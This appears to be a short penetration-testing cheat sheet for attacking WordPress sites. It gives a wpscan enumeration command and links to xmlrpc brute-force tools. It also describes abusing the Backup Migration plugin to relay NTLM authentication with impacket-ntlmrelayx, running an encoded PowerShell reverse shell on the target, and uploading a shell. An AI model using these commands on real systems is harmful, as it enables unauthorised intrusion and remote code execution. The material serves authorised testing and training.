---
layout: blank
pagetitle: Testing Wordpress
---


- Use `wpscan` and investigate the plugins
	- `wpscan --url http://{IP} --enumerate vt,vp,u --plugins-detection aggressive --random-user-agent --api-token {token}`
	- Look for `[!] This version is out of date`
	- Can use searchsploit for these plugins or the wpscan vuln database
- xmlrpc.php
  - Can be exploited in a number of ways
  - [https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/tree/master](https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/tree/master) - password brute forcing tool
  - [https://github.com/rm-onata/xmlrpc-attack](https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/tree/master) - general attacking tool?
- If signed into the wordpress page
	- Check out plugins from the inside
	- Check out the Backup Migration
		- Changing this to our IP can allow us to relay authentication (if signing is disabled)
		- `//{kali_ip}/test` with `sudo impacket-ntlmrelayx --no-http-server -smb2support -t {relay_target_IP} -c "powershell -enc {reverse_shell}"`
	- Try to upload a shell